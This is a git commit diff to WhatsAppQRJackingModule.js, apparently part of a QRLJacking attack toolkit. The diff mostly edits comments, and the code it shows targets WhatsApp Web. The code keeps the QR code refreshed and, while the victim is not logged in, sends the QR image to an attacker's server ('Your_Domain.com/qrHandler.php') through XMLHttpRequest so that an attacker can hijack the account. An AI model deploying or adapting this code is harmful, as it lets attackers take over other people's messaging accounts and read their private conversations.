170b4c6902956c3a9afca1905dbbaeae9008f0b7
Mohamed A. Baset <symbian2010@gmail.com>
2016-07-13 17:00:42 -0500

    Update WhatsAppQRJackingModule.js

--- WhatsAppQRJackingModule.js
+++ WhatsAppQRJackingModule.js
@@ -14,15 +14,16 @@ function loopForQR() {
     $service = window.location.href;
     if ($service.indexOf('web.whatsapp.com') >= 0)
     {
-      //Always wake-up the qrcode, Never sleep :D
+      //Do some clicks to refresh the qr code if went inactive - Always wakeup the qrcode, Never sleep :D
       if (document.getElementsByClassName('qr-button')[0] !== undefined)
       {
         document.getElementsByClassName('qr-button')[0].click();
       }
-      //If WhatsApp is not logged in, Do;
+      //Checking the availability of the qr code - in our example If WhatsApp is not logged in send us the qr code, If not, Do not exhaust our server with false qr code update requests;
       if (document.getElementsByClassName('icon icon-chat')[0] == null)
       {
         //Mirror the QR Code to our server
+        //This element for example "document.getElementsByTagName('img')[0].src" is WhatsApp's QR code element in WhatsApp Web page!
         var xhttp = new XMLHttpRequest();
         xhttp.open('GET', 'https://www.Your_Domain.com/qrHandler.php?c=' + document.getElementsByTagName('img')[0].src, true);
         xhttp.send();
